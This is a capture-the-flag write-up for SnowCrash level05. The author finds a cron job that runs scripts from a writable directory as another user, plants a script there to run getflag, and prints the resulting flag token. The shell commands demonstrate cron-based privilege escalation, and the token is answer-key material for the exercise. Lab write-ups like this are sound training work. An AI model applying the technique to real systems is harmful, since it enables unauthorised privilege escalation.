## level05

I logged in as `level05` with `su` after getting the password, started looking around… no obvious clues. Then I decided to start fresh and when I start a new SSH session as `level05` I get this:

```bash
level05@192.168.1.59's password: 
You have new mail.
```

Some [research](https://unix.stackexchange.com/questions/82910/how-can-i-find-my-local-mail-spool) about mail in Linux leads me to `/var/spool/$USER` 

<aside>
💡

A mail spool is a directory or file where email messages are temporarily stored by the mail server before they are delivered to the recipient's mailbox. 

</aside>

Let’s check the content of that file:

```bash
level05@SnowCrash:~$ cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It looks like a crontab running every 2 minutes…

I check my crontabs with `cronttab -l`: nothing.

Let’s see what’s this executable file:

```bash
level05@SnowCrash:~$ ll /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver*
# The file is owned by flag05
```

The '+' in the permissions means there are special permissions in place, ACL (Access Control List). I can check them with `getfacl`

```bash
level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

No surprises there. But what’s in the file?

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So in natural language, “for each file in the `/opt/openarenaserver/` directory, keeping the CPU time under 5 seconds, execute the file in tracing mode and remove it”. These will be executed by flag05, so if I were to make them call `getflag` it would be done…

I checked that I could write in `/opt/openarenaserver/`and since I could, I placed there a file like

```bash

level05@SnowCrash:~$ vim /opt/openarenaserver/key.sh

#!/bin/sh
getflag > /tmp/flag

level05@SnowCrash:~$ chmod 777 /opt/openarenaserver/key.sh

level05@SnowCrash:~$ ls /opt/openarenaserver/
key.sh
```

waited 2 minutes for the crontab to find it and call it and

```bash
level05@SnowCrash:~$ ls /tmp/flag
/tmp/flag
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### Key learnings
- Privilege escalation via cron